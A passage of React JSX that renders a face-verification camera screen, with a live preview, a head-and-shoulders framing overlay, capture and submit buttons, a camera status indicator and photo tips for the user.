      <div className="grid grid-cols-1 md:grid-cols-2 gap-8 w-full max-w-screen-xl mx-auto px-4">
        <div className="relative w-full max-w-md mx-auto">
          <div className="bg-black rounded-xl aspect-square flex items-center justify-center w-full relative overflow-hidden shadow-lg">

            {!photoURL ? (
              <>
                {!capturing && (
                  <div className="absolute inset-0 flex items-center justify-center text-white bg-gray-800">
                    <CameraIcon className="h-16 w-16 opacity-50" />
                  </div>
                )}
                <video
                  ref={videoRef}
                  autoPlay
                  muted
                  playsInline
                  className={`w-full h-full object-cover bg-black ${capturing ? '' : 'hidden'}`}
                  aria-label="Camera preview"
                />
                {/* Chest-Up Face Frame Overlay */}
                {capturing && (
                  <div className="absolute inset-0 z-10 pointer-events-none flex items-center justify-center">
                    <svg
                      viewBox="0 0 400 600"
                      className="w-[380px] h-[520px]"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      {/* Head & Shoulders Outline - stretched */}
                      <path
                        d="M200 180c-50 0-90 40-90 90s40 90 90 90 90-40 90-90-40-90-90-90zm0 200c-110 0-160 70-160 110h320c0-40-50-110-160-110z"
                        stroke="white"
                        strokeWidth="2.5"
                        fill="none"
                        opacity="0.9"
                      />

                      {/* Side & Center Corner Guides */}
                      <g stroke="white" strokeWidth="3" opacity="0.4">
                        {/* Top center */}
                        <path d="M190 40h20M200 40v20" />
                        {/* Bottom center */}
                        <path d="M190 560h20M200 560v-20" />
                        {/* Left center */}
                        <path d="M40 290h20M40 280v20" />
                        {/* Right center */}
                        <path d="M360 290h-20M360 280v20" />
                      </g>
                    </svg>
                  </div>
                )}

                {capturing && (
                  <button
                    onClick={() => setUseFrontCamera(!useFrontCamera)}
                    className="absolute top-4 right-4 p-2 bg-white bg-opacity-50 rounded-full hover:bg-opacity-100 transition-opacity duration-200"
                    title="Switch Camera"
                    aria-label="Switch between front and rear cameras"
                  >
                    <ArrowsRightLeftIcon className="h-5 w-5 text-gray-800" />
                  </button>
                )}
              </>
            ) : (
              <>
                <img
                  src={photoURL}
                  alt="Captured face"
                  className="w-full h-full object-cover bg-black"
                />
                <button
                  onClick={() => {
                    URL.revokeObjectURL(photoURL);
                    setPhotoURL("");
                  }}
                  className="absolute top-4 right-4 p-2 bg-white bg-opacity-50 rounded-full hover:bg-opacity-100 transition-opacity duration-200"
                  aria-label="Close photo"
                >
                  <XMarkIcon className="h-5 w-5 text-gray-800" />
                </button>
              </>
            )}
          </div>

          <canvas
            ref={canvasRef}
            className="hidden"
          />

          <div className="flex justify-center mt-6">
            <button
              onClick={handleCameraClick}
              className={`relative p-4 rounded-full hover:opacity-90 transition-opacity duration-200
               ${isSaving ? 'bg-gray-400 cursor-not-allowed' :
                  photoURL ? 'bg-gray-600' :
                    capturing ? 'bg-red-600' : 'bg-indigo-600'}`}
              aria-label={photoURL ? "Retake photo" : capturing ? "Capture photo" : "Start camera"}
              disabled={isSaving}
            >
              {isSaving ? (
                <svg className="animate-spin h-8 w-8 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor"
                    d="M4 12a8 8 0 018-8v8H4z"></path>
                </svg>
              ) : (
                <CameraIcon className="h-8 w-8 text-white" />
              )}
            </button>
          </div>

          {cameraStatus && (
            <div className="flex justify-center mt-4">
              <button
                onClick={handleSubmitPhoto}
                disabled={uploading}
                className="flex items-center gap-2 px-6 py-3 bg-indigo-600 text-white rounded-md 
                         hover:bg-indigo-700 disabled:opacity-50 transition-colors duration-200"
                aria-label="Submit photo"
              >
                {uploading ? (
                  <ArrowPathIcon className="h-5 w-5 animate-spin" />
                ) : (
                  <>
                    <ArrowUpTrayIcon className="h-5 w-5" />
                    <span>Submit Verification</span>
                  </>
                )}
              </button>
            </div>
          )}
        </div>

        <div className="flex flex-col justify-center space-y-6">
          <div className="flex items-center gap-3">
            <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
            <span className="text-gray-700">
              {cameraReady ? 'Camera Ready' :
                cameraStatus ? 'Camera Initializing...' : 'Camera Not Ready'}
            </span>
          </div>

          <h2 className="text-xl font-semibold text-gray-800">
            Face Verification Required
          </h2>

          {/* <p className="text-gray-600">
            Please take a clear photo of your face for identity verification.
          </p> */}

          <ul className="space-y-3 text-gray-600">
            <li className="flex items-start gap-2">
              <span className="text-gray-500">•</span>
              <span>Make sure your face is clearly visible</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-gray-500">•</span>
              <span>Remove sunglasses, hats, or face coverings</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-gray-500">•</span>
              <span>Use good lighting - avoid shadows on your face</span>
            </li>
          </ul>
        </div>
      </div>
    </Layout>
  );
}